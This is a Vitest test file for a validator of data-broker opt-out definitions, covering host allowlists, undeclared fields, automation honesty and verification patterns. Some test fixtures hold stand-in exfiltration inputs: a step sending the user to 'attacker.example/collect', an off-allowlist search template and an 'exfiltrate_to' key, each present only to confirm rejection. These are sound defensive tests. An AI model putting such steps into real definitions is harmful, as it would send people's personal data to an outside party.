import { describe, expect, it } from 'vitest';
import { checkDefinition, templateFields } from './validate.ts';
import type { BrokerDefinitionInput } from './broker.ts';

const base = (): BrokerDefinitionInput => ({
  id: 'example-broker',
  name: 'Example Broker',
  homepage: 'https://example-broker.test',
  version: '1.0.0',
  category: 'people_search',
  jurisdictions: ['US'],
  hosts: ['example-broker.test'],
  automation: { level: 'automated' },
  search: {
    method: 'url_template',
    url_template: 'https://example-broker.test/search/{name_slug}',
    result_selector: '.result',
    fields: { name: { selector: '.name', attr: 'text' }, url: { selector: 'a', attr: 'href' } },
  },
  match: { fields: { name: 1 } },
  opt_out: {
    method: 'form',
    url: 'https://example-broker.test/optout',
    required_fields: ['listing_url', 'email'],
    steps: [
      { id: 'open', action: 'goto', url: 'https://example-broker.test/optout' },
      { id: 'url', action: 'fill', selector: '#url', value: '{{listing_url}}' },
      { id: 'email', action: 'fill', selector: '#email', value: '{{email}}' },
      { id: 'submit', action: 'click', selector: '#submit' },
    ],
  },
  verification: {
    method: 'email_link',
    expected_senders: ['@example-broker.test'],
    link_pattern: 'https://example-broker\\.test/confirm/[A-Za-z0-9]+',
  },
  relist: { interval_days: 90 },
});

const errorCodes = (r: ReturnType<typeof checkDefinition>) =>
  r.issues.filter((i) => i.severity === 'error').map((i) => i.code);

describe('templateFields', () => {
  it('extracts placeholders and ignores literals', () => {
    expect([...templateFields('a {{email}} b {{ phone }}', undefined, 'none')]).toEqual(['email', 'phone']);
  });
});

describe('checkDefinition', () => {
  it('accepts a well-formed definition', () => {
    const r = checkDefinition(base(), 'example-broker');
    expect(errorCodes(r)).toEqual([]);
    expect(r.ok).toBe(true);
  });

  it('warns that an unverified definition is theoretical', () => {
    const r = checkDefinition(base(), 'example-broker');
    expect(r.issues.map((i) => i.code)).toContain('unverified');
  });

  it('rejects an id that does not match the filename', () => {
    expect(errorCodes(checkDefinition(base(), 'something-else'))).toContain('id_filename_mismatch');
  });

  // The central supply-chain control: a definition cannot reach a host it has
  // not declared. See docs/threat-model.md TB8.
  it('rejects a step pointing at a host outside the allowlist', () => {
    const d = base();
    d.opt_out.steps = [{ id: 'evil', action: 'goto', url: 'https://attacker.example/collect' }];
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('host_not_allowlisted');
  });

  it('rejects a search template pointing off-allowlist', () => {
    const d = base();
    d.search = { ...d.search, method: 'url_template', url_template: 'https://attacker.example/s/{name_slug}' } as never;
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('host_not_allowlisted');
  });

  it('allows a subdomain of an allowlisted host', () => {
    const d = base();
    d.opt_out.url = 'https://privacy.example-broker.test/optout';
    d.opt_out.steps = [
      { id: 'open', action: 'goto', url: 'https://privacy.example-broker.test/optout' },
      { id: 'url', action: 'fill', selector: '#url', value: '{{listing_url}}' },
      { id: 'email', action: 'fill', selector: '#email', value: '{{email}}' },
    ];
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toEqual([]);
  });

  // The second supply-chain control: no reaching for data you did not declare.
  it('rejects a template referencing an undeclared profile field', () => {
    const d = base();
    d.opt_out.steps = [...d.opt_out.steps!, { id: 'dob', action: 'fill', selector: '#dob', value: '{{dob}}' }];
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('undeclared_field');
  });

  it('warns about a declared field that is never used', () => {
    const d = base();
    d.opt_out.required_fields = ['listing_url', 'email', 'dob'];
    expect(checkDefinition(d, 'example-broker').issues.map((i) => i.code)).toContain('unused_field');
  });

  it('rejects duplicate step ids', () => {
    const d = base();
    d.opt_out.steps = [
      { id: 'open', action: 'goto', url: 'https://example-broker.test/optout' },
      { id: 'open', action: 'click', selector: '#x' },
    ];
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('duplicate_step_id');
  });

  // Honesty about automation is enforced, not trusted.
  it('rejects an "automated" definition that contains a handoff', () => {
    const d = base();
    d.opt_out.steps = [
      ...d.opt_out.steps!,
      { id: 'captcha', action: 'handoff', reason: 'captcha', instructions: 'Solve the challenge and submit.' },
    ];
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('automation_overclaimed');
  });

  it('accepts the same definition at level "assisted" with a reason', () => {
    const d = base();
    d.automation = { level: 'assisted', reason: 'CAPTCHA on the opt-out form' };
    d.opt_out.steps = [
      ...d.opt_out.steps!,
      { id: 'captcha', action: 'handoff', reason: 'captcha', instructions: 'Solve the challenge and submit.' },
    ];
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toEqual([]);
  });

  it('requires a reason when the level is not automated', () => {
    const d = base();
    d.automation = { level: 'manual' };
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('missing_reason');
  });

  it('never lets a phone opt-out claim to be automated', () => {
    const d = base();
    d.opt_out = { method: 'phone', required_fields: [], phone: '+1-800-555-0100', instructions: 'Call and ask.' };
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('automation_overclaimed');
  });

  it('requires link_pattern and senders for email_link verification', () => {
    const d = base();
    d.verification = { method: 'email_link' };
    const codes = errorCodes(checkDefinition(d, 'example-broker'));
    expect(codes).toContain('missing_link_pattern');
    expect(codes).toContain('missing_senders');
  });

  it('rejects a link_pattern that is not anchored to an https URL', () => {
    const d = base();
    d.verification = { method: 'email_link', expected_senders: ['@example-broker.test'], link_pattern: '.*' };
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('unanchored_link_pattern');
  });

  it('rejects unknown top-level keys', () => {
    const d = { ...base(), exfiltrate_to: 'https://attacker.example' };
    expect(checkDefinition(d, 'example-broker').ok).toBe(false);
  });

  it('rejects auto_confirm below the review threshold', () => {
    const d = base();
    d.match = { fields: { name: 1 }, thresholds: { review: 0.8, auto_confirm: 0.5 } };
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('threshold_order');
  });

  it('requires an email block for the email method', () => {
    const d = base();
    d.opt_out = { method: 'email', required_fields: ['full_name'], steps: [] };
    expect(errorCodes(checkDefinition(d, 'example-broker'))).toContain('missing_email');
  });
});
